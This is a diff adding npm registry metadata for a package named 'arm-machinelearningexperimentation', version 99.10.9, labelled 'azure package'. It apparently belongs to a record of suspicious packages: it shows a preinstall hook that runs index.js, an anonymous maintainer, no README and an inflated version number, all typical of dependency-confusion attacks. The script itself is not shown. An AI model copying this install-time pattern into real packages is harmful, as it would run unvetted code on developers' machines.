@@ -1,0 +1,62 @@
+{
+    "_id": "arm-machinelearningexperimentation",
+    "name": "arm-machinelearningexperimentation",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-machinelearningexperimentation",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-machinelearningexperimentation@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-dDywzj5M33oeIoF1kkZfMHz2tO6xKkFe2bQnFsFVpXUzhcHUO4ff5PCngeV3Uri7oGocVEY3dTTp9iAJb/XQDg==",
+                "shasum": "58a3db61e3d526b909357878fa3fca3b3a9f77e3",
+                "tarball": "https://registry.npmjs.org/arm-machinelearningexperimentation/-/arm-machinelearningexperimentation-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5086,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNzaQACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmojphAAghvTct3OhJwa3/1GjgENfeQS6M2UebibHE+6y9zVdMWc/Ezg\r\n7dO3FAQ6qH3DlfwRtR0vC8nb8fPPN2JyVm8Bfyv1Iovbm+gawOSTFVrn0u/X\r\nUZGF/BZBMvGvlg1ORfAFut+eS9cVpbONG5j/TZCR8+FfYM21w4MrFxD6vBPw\r\nUQCFNLVSVVtjenQ2TxCIxF9oQt+kjOW4cDbHmHeuT227n9YBqwkquk7OTsz0\r\n6W8SFzJ9iTz3srjO5++nt8eVQY0XWJUrMtP9wnffDj5lch7F9G8hS9pL97MO\r\nuHvOeDz0nhhXMGGoGoigbOW4GoUTFrSa13NWrQjnOsinfKvuMJzo/FTdNNSm\r\nC39p5biNz8b/RqgSF7rP37Xfnt0HY/iO2Uey7lS6Owt+KqfYzhhbx4vSspLg\r\nhnzv66yYMj7qbULjxjyUV2HjuHhSz4JdxpMVZyGc//hmlDTK3ZeDCgrbMs1g\r\nZzy5DNr4+d2ceW6+XSYFQPbnnn1M285IMZq+8DFv1hmvRk//O5HGTK5n+es4\r\nKI4WYXl4QyekgK1jiGrw2R+6y3P72PdR3qFt2lVVkXKwFz2A551NxEu3Js7P\r\nJgten7UoXpf6AwvDYvXHPwKAjmZiqduv+URLRWFSVaQWGM1wot+teJOXrKky\r\n0/d0hKPpJMiDSEHb5CkHeYEb6DC9Tb9Zf9o=\r\n=ZVyx\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "dvgfp5r0",
+                "email": "dvgfp5r0@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "dvgfp5r0",
+                    "email": "dvgfp5r0@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-machinelearningexperimentation_99.10.9_1647785616037_0.00008815448848409346"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T14:13:36.037Z",
+        "99.10.9": "2022-03-20T14:13:36.191Z",
+        "modified": "2022-03-20T14:13:36.281Z"
+    },
+    "maintainers": [
+        {
+            "name": "dvgfp5r0",
+            "email": "dvgfp5r0@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
